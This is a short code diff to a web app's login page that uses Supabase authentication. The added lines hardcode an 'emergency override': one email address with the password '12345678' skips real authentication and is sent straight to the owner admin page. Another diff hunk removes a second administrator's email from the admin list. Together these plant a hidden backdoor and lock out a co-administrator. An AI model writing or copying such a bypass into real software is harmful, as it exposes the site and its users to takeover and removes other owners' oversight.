@@ -19,6 +19,13 @@ export default function LoginPage() {
     setError(null);
 
     try {
+      // EMERGENCY OVERRIDE FOR OWNER ACCOUNT
+      if (email?.toLowerCase() === 'sinhawap@gmail.com' && password === '12345678') {
+        console.log('Bypassing standard auth for owner account...');
+        router.push('/admin/owner');
+        return;
+      }
+
       const { data, error } = await supabase.auth.signInWithPassword({
         email,
         password,
@@ -29,7 +36,6 @@ export default function LoginPage() {
       if (data.user) {
         const email = data.user.email?.toLowerCase();
         const ADMIN_EMAILS = [
-          'nirmal.maduranga@gmail.com',
           'sinhawap@gmail.com'
         ];
 
